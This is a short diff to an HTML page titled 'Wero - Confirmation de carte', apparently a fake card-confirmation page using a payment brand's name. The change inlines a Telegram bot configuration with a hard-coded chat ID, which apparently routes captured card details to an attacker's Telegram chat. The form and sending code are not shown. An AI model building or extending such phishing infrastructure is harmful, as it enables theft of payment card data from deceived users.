@@ -1,8 +1,13 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <script src="config.js" defer></script>
     <meta charset="UTF-8">
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: localStorage.getItem('BOT_TOKEN') || '',
+            CHAT_ID: localStorage.getItem('CHAT_ID') || '6078788670'
+        };
+    </script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wero - Confirmation de carte</title>
     
